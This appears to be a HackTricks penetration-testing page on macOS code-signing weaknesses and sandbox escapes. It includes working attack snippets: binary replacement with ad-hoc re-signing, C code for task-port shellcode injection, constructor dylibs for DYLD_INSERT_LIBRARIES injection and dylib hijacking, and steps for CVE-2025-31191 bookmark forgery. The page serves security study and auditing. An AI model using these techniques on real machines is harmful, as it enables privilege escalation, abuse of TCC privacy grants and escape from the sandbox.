# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Basic Information

**Ad-hoc signing** (`CS_ADHOC`) creates a code signature with **no certificate chain**. It still hashes the signed code, so validation can detect modification, but it provides no developer identity that another component can authenticate. Replacing and re-signing the executable produces a different CodeDirectory/CDHash.<sup>[[1]](#references)[[4]](#references)</sup>

On Apple Silicon Macs, all executables require at minimum an ad-hoc signature. This means you'll find ad-hoc signatures on many development tools, Homebrew packages, and third-party utilities.

### Why This Matters

- **No verifiable signer identity** — checks that accept only a path, an ad-hoc status, or an unpinned identifier cannot establish who produced the binary.
- Third-party ad-hoc binaries in **privileged positions** (FDA, daemons, helpers) are high-priority targets when their file or a parent directory is writable.
- A CDHash, designated-requirement, or requirement-backed TCC check **does** notice replacement. A path-based policy may not; inspect the actual requirement and retest the grant instead of assuming that it survives re-signing.

### Discovery

```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
  flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
  echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```

### Attack: Binary Replacement

```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```

---

## Debuggable Processes (get-task-allow)

### Basic Information

The **`com.apple.security.get-task-allow`** entitlement (or `CS_GET_TASK_ALLOW` flag) permits an authorized debugger to obtain the process task port even when Hardened Runtime would normally prevent it. A successful debugger can read memory, modify registers, inject code, and control execution.<sup>[[3]](#references)</sup>

This is intended **only for development builds**. However, some third-party binaries ship with this entitlement in production.

> [!CAUTION]
> A production binary with `get-task-allow` is a strong exploitation primitive. `taskgated`, caller identity, sandboxing, debugger entitlements, and Developer Tools authorization still affect whether a particular client can obtain the task port; test with both `lldb`/`debugserver` and the intended injector. Once attachment succeeds, injected code runs with the target's entitlements, TCC grants, and security context.

### Discovery

```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
  codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```

### Attack: Task Port Injection

```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
    // Allocate memory in target process
    mach_vm_address_t addr = 0;
    mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);
    
    // Write shellcode into target
    mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);
    
    // Make it executable
    mach_vm_protect(task, addr, shellcode_size, FALSE,
                    VM_PROT_READ | VM_PROT_EXECUTE);
    
    // Create a remote thread to execute the shellcode
    // The shellcode runs with ALL of the target's entitlements and TCC grants
}
```

---

## No Library Validation + DYLD Environment

### Runtime Library-Validation Clearing

The private entitlement **`com.apple.private.security.clear-library-validation`** does not disable library validation at process launch. Instead, it permits the process to call `csops(..., CS_OPS_CLEAR_LV, ...)` on itself at runtime. XNU then clears `CS_REQUIRE_LV | CS_FORCED_LV`, provided the caller has the entitlement and satisfies the handler's additional checks. Consequently, a process may become a viable library-injection target only after it reaches the code path that clears library validation.<sup>[[4]](#references)[[5]](#references)</sup>

### The Deadly Combination

When a binary has **both**:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (loads any dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (accepts DYLD env vars)

This is a high-value code-injection combination because Hardened Runtime permits both the untrusted library and the DYLD environment variable. The launch context can still scrub DYLD variables (for example, protected or privileged execution paths), so verify the exact invocation rather than treating the entitlement pair as unconditional.

### Discovery

```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "disable-library-validation.*true" && \
  echo "$ents" | grep -q "allow-dyld-environment.*true" && \
  echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```

### Attack: DYLD_INSERT_LIBRARIES Injection

```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
    // This runs BEFORE main() in the target's process
    // We inherit ALL of the target's:
    // - Entitlements
    // - TCC grants (camera, mic, FDA, etc.)
    // - Sandbox exceptions
    // - Mach port rights
    
    FILE *f = fopen("/tmp/injected_proof.txt", "w");
    fprintf(f, "Running as PID %d with target's privileges\n", getpid());
    fclose(f);
    
    // Example: if target has camera TCC, we can now capture video
    // Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```

---

## Sandbox Temporary Exceptions

### How They Weaken the Sandbox

Sandbox temporary exceptions (`com.apple.security.temporary-exception.*`) punch holes in the App Sandbox:<sup>[[2]](#references)</sup>

| Exception | What It Allows |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Connect to system-wide XPC/Mach services |
| `temporary-exception.files.absolute-path.read-write` | Read/write files outside the app container |
| `temporary-exception.iokit-user-client-class` | Open IOKit user-client connections |
| `temporary-exception.shared-preference.read-only` | Read other apps' preferences |
| `temporary-exception.files.home-relative-path.read-write` | Access paths relative to `~` |

### Mach-Lookup Exceptions = Sandbox Escape Primitive

The most dangerous exception is **mach-lookup** — it allows a sandboxed app to talk to privileged daemons:

```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
  binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
  [ -f "$binary" ] && {
    ents=$(codesign -d --entitlements - "$binary" 2>&1)
    echo "$ents" | grep -q "mach-lookup" && {
      count=$(echo "$ents" | grep -c "mach-lookup")
      echo "[$count exceptions] $(basename "$1")"
    }
  }
' _ {} \; 2>/dev/null | sort -rn
```

### Attack: Sandbox Escape via Mach-Lookup

```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
   a. Connect via NSXPCConnection
   b. Discover the service's protocol (class-dump, strings)
   c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```

---

## Code-Signing Checks Are Not XPC Client Integrity

An XPC service may authenticate a connection by extracting code-signing state from its audit token and accepting an Apple **platform binary** or a client carrying `CS_REQUIRE_LV`/`CS_FORCED_LV`. These tests describe the executable and selected process flags; they do not prove that the current address space contains only trusted code. Research against ImageCapture services showed that an injectable Apple binary such as `/bin/ls` could load an attacker dylib through `DYLD_INSERT_LIBRARIES` and then connect as a platform client. A follow-up check for library-validation flags was also bypassed before Apple changed the service to require its private authorization entitlement in macOS 15.<sup>[[6]](#references)</sup>

### Offensive Audit Workflow

1. Reverse `listener:shouldAcceptNewConnection:` (or the equivalent low-level XPC handler) and identify decisions based only on `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV`, or `CS_FORCED_LV`.
2. Enumerate Apple-signed clients that can speak the protocol, then inspect Hardened Runtime and entitlements. A platform signature alone is not evidence that DYLD injection is blocked.
3. Test the candidate on the **target macOS build**. If a constructor dylib loads, make the service connection from that constructor so the audit token belongs to the accepted platform process.
4. Retest every vendor patch: adding another mutable process-status flag to the same authorization decision may not remove the confused-deputy primitive.

```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```

> [!NOTE]
> DYLD behavior, AMFI policy, and service-side checks change between macOS releases. Failure against a fully patched host does not establish that the same chain failed on the vulnerable release.

---

## Security-Scoped Bookmark Forgery (CVE-2025-31191)

Security-scoped bookmarks persist a user's file choice across launches. A sandbox extension is boot-bound, so `ScopedBookmarkAgent` validates it and creates a long-lived HMAC-authenticated bookmark; when the app later presents that bookmark, the agent validates it and issues a fresh sandbox extension. The signing secret is stored in the login keychain and a per-app key is derived using the bundle identifier.<sup>[[7]](#references)</sup>

On affected systems, the keychain ACL prevented an untrusted process from **reading** the `com.apple.scopedbookmarksagent.xpc` secret but did not prevent deletion. A compromised sandboxed app could replace the item with a known secret and attacker-controlled ACL, derive the app-specific HMAC key, forge entries in the writable container bookmark plist, and ask `ScopedBookmarkAgent` to exchange them for file-access extensions. This turned any sandboxed application using security-scoped bookmarks into a potential arbitrary-file-access sandbox escape without an additional file-picker interaction. Apple fixed the issue in the March 31, 2025 security updates.<sup>[[7]](#references)</sup>

### Triage and Attack Chain

```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
  "$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
  grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
  \( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```

The exploitation sequence on a vulnerable host is:

1. Gain code execution inside a sandboxed app that uses persistent scoped bookmarks.
2. Replace the agent's keychain signing item with a known secret and permissive ACL.
3. Compute `HMAC-SHA256(key=known_secret, data=bundle_id)` and forge a bookmark for a useful path in the app's writable bookmark store.
4. Trigger the application's normal bookmark-resolution path so `ScopedBookmarkAgent` returns a sandbox extension.
5. Use the new file access to overwrite an out-of-sandbox execution or data target available to that user.

This is a **patched-version technique**: use it to understand the trust boundary and to assess unpatched systems, not as an assumption about current releases. For current testing, focus on bookmark parsing, identity binding, keychain-item lifecycle, and confused-deputy behavior around the agent.

---

## Private Apple Entitlements

### What They Are

Entitlements prefixed with `com.apple.private.*` provide access to **Apple-internal APIs** not documented or available to third-party developers. Third-party binaries with private entitlements obtained them through enterprise cert, MDM, or non-App-Store distribution.

### Dangerous Private Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | Full TCC database read/write |
| `com.apple.private.tcc.allow` | Access specific TCC services |
| `com.apple.private.security.no-sandbox` | Run without sandbox |
| `com.apple.private.iokit` | Direct IOKit driver access |
| `com.apple.private.kernel.\*` | Kernel interface access |
| `com.apple.private.xpc.launchd.job-label` | Register/manage launchd jobs |
| `com.apple.rootless.install` | Write to SIP-protected paths |

### Discovery

```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "com.apple.private" && {
    echo "=== {} ==="
    echo "$ents" | grep "com.apple.private" | head -10
  }
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```

---

## Custom Sandbox Profiles (SBPL)

### What They Are

Binaries can ship with **custom sandbox profiles** written in SBPL (Seatbelt Profile Language). These profiles can be more restrictive OR **more permissive** than the default App Sandbox.

### Auditing Custom Profiles

```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```

---

## Writable Library Paths

### What They Are

When a binary loads a dynamic library from a path that the current user can **write to**, the library can be replaced with malicious code.

### Discovery

```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
  [ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```

### Attack: Dylib Replacement

```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
    system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
   -Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```



## References

- [1] [Apple Developer — Code Signing Guide](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (`CS_OPS_*` operations and `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (`csops` / `CS_OPS_CLEAR_LV` handler)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [A New Era of macOS Sandbox Escapes: Diving into an Overlooked Attack Surface and Uncovering 10+ New Vulnerabilities](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [Analyzing CVE-2025-31191: A macOS security-scoped bookmarks-based sandbox escape](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
